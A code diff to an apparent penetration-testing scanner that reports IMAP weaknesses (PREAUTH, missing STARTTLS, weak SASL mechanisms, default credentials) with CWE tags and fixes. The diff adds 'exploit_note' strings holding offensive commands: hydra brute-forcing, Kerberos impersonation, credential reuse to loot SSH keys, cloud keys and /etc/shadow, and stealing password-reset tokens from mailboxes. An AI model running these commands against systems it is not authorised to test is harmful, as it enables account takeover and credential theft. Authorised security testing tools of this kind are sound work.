@@ -675,7 +675,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Disable transport-authenticated PREAUTH mode; require an explicit "
                     "LOGIN / AUTHENTICATE for every session, or restrict the listener "
                     "to the localhost bridge that actually authenticates it.",
-                    ["CWE-287", "CWE-306"], kind="imap_preauth_greeting"))
+                    ["CWE-287", "CWE-306"], kind="imap_preauth_greeting",
+                    exploit_note=(
+                        "nc IP PORT ; then: a1 LIST \"\" \"*\" ; a2 SELECT INBOX ; "
+                        "a3 FETCH 1:5 (BODY.PEEK[HEADER.FIELDS (SUBJECT FROM TO)])"),
+                    depth_tier="t3"))
 
             # No STARTTLS on 143.
             if p.portid == 143 and not pr.get("starttls") and not pr.get("preauth"):
@@ -688,7 +692,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Offer STARTTLS on 143 (mail_ssl = required in Dovecot; "
                     "'starttls' in Cyrus imapd.conf) or move mail to 993 / require "
                     "implicit TLS per RFC 8314.",
-                    ["CWE-319"], kind="imap_no_starttls"))
+                    ["CWE-319"], kind="imap_no_starttls",
+                    exploit_note=(
+                        "tcpdump -i any -A 'tcp port 143 and host IP' during a real "
+                        "user session -- every LOGIN is in clear."),
+                    depth_tier="t0"))
 
             # Plaintext LOGIN accepted pre-TLS.
             if pr.get("plaintext_login") == "accepted" and p.portid == 143:
@@ -705,7 +713,11 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Set LOGINDISABLED until STARTTLS completes (Dovecot: "
                     "disable_plaintext_auth = yes; Cyrus: allowplaintext: no); "
                     "prefer implicit TLS on 993.",
-                    ["CWE-319", "CWE-522"], kind="imap_login_plaintext_allowed"))
+                    ["CWE-319", "CWE-522"], kind="imap_login_plaintext_allowed",
+                    exploit_note=(
+                        "hydra -L smtp_enum_users.txt -P rockyou.txt "
+                        "imap://IP:143 -t 4 -f -V"),
+                    depth_tier="t1"))
 
             # STARTTLS downgrade: LOGINDISABLED lied.
             if pr.get("starttls_downgrade"):
@@ -740,7 +752,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"openssl s_client -connect {h.ip}:{p.portid}   # then a1 CAPABILITY",
                     f"Remove AUTH={mech} from the offered mechanisms; require a "
                     "SCRAM-family or Kerberos-only auth policy.",
-                    ["CWE-327", "CWE-522"], kind="imap_sasl_mechanisms"))
+                    ["CWE-327", "CWE-522"], kind="imap_sasl_mechanisms",
+                    exploit_note=(
+                        "openssl s_client -connect IP:993 ; a1 CAPABILITY ; then "
+                        "for AUTH=NTLM: a2 AUTHENTICATE NTLM + base64(NTLMSSP "
+                        "Type-1) ; parse Type-2 AV_PAIRs (nmap --script "
+                        "imap-ntlm-info)."),
+                    depth_tier="t0"))
                 if mech.upper() == "GSSAPI":
                     out.append(_finding(
                         "high", "IMAP AUTH=GSSAPI advertised (Kerberos relay surface)", tgt,
@@ -750,7 +768,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         f"# capture / relay Kerberos context against {h.ip}",
                         "Restrict GSSAPI to a specific service principal; monitor "
                         "for anomalous delegation.",
-                        ["CWE-287"], kind="imap_gssapi_relay"))
+                        ["CWE-287"], kind="imap_gssapi_relay",
+                        exploit_note=(
+                            "impacket-getST -spn imap/mail.domain.local -impersonate "
+                            "'admin' -k -no-pass 'DOMAIN/svc' ; then use the ticket via "
+                            "KRB5CCNAME with an IMAP client that supports GSSAPI "
+                            "(evolution / offlineimap with kerberos)."),
+                        depth_tier="t0"))
 
             # ANONYMOUS actually accepted.
             if pr.get("anonymous"):
@@ -762,7 +786,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"openssl s_client -connect {h.ip}:{p.portid}   # a1 AUTHENTICATE ANONYMOUS",
                     "Remove AUTH=ANONYMOUS from the mech list unless a public "
                     "mailbox is explicitly intended.",
-                    ["CWE-306"], kind="imap_anonymous_allowed"))
+                    ["CWE-306"], kind="imap_anonymous_allowed",
+                    exploit_note=(
+                        "openssl s_client -connect IP:PORT ; a1 AUTHENTICATE "
+                        "ANONYMOUS ; + <base64 arbitrary trace> ; then a2 LIST "
+                        "\"\" \"*\" ; a3 SELECT INBOX"),
+                    depth_tier="t3"))
 
             # CRAM-MD5 / DIGEST-MD5 challenge capture.
             for mech, field, mode in (("CRAM-MD5", "cram_md5_challenge", 10200),
@@ -807,7 +836,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "vendor",
                         "# consult the vendor advisory for the matched CVE(s)",
                         "Upgrade to a vendor-supported build.",
-                        cwes, kind="imap_version_cve"))
+                        cwes, kind="imap_version_cve",
+                        exploit_note=(
+                            "searchsploit dovecot 2.3 ; for Dovecot: "
+                            "https://dovecot.org/security.html for exact CVE ; do "
+                            "NOT fire memory-corruption PoC in prod without ROE."),
+                        depth_tier="t0"))
                     break
 
             # User enumeration hits (only when the sweep found asymmetry).
@@ -839,7 +873,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Reset the account to a unique high-entropy secret; audit "
                     "any other service the same identity has (mail servers often "
                     "share the AD identity across SMB / VPN / web SSO).",
-                    ["CWE-521", "CWE-1392"], kind="imap_default_creds"))
+                    ["CWE-521", "CWE-1392"], kind="imap_default_creds",
+                    exploit_note=(
+                        "Try the landed pair as: ssh <user>@IP ; smbclient -L "
+                        "//IP -U '<user>%<pw>' ; then loot ~/.ssh, ~/.aws, "
+                        "/etc/shadow if root-adjacent."),
+                    depth_tier="t3"))
             if cred.get("login"):
                 mb = cred.get("mailboxes") or {}
                 boxes = mb.get("list") or []
@@ -856,7 +895,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         tgt, detail, "imap",
                         "# after LOGIN: a1 LIST \"\" \"*\"  ;  a2 LSUB \"\" \"*\"",
                         "Restrict shared / public mailboxes; audit ACLs (RFC 4314).",
-                        ["CWE-863"], kind="imap_mailbox_access"))
+                        ["CWE-863"], kind="imap_mailbox_access",
+                        exploit_note=(
+                            "python3 -c 'import imaplib; m=imaplib.IMAP4_SSL(\"IP\"); "
+                            "m.login(u,p); print(m.list()); m.select(\"INBOX\"); "
+                            "print(m.search(None,\"ALL\"))'"),
+                        depth_tier="t3"))
                 loot = cred.get("loot") or []
                 if loot:
                     out.append(_finding(
@@ -869,7 +913,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "Educate users to delete transport-of-secret mail; enforce "
                         "MFA on downstream services so a mailbox read does not "
                         "yield a valid credential.",
-                        ["CWE-200", "CWE-538"], kind="imap_loot_hits"))
+                        ["CWE-200", "CWE-538"], kind="imap_loot_hits",
+                        exploit_note=(
+                            "After login: a1 SELECT INBOX ; a2 SEARCH SUBJECT "
+                            "\"password reset\" ; a3 FETCH <seq> (BODY.PEEK[TEXT]) "
+                            "to pull the reset token; use it on the origin service "
+                            "before it expires."),
+                        depth_tier="t4"))
     return out
 
 
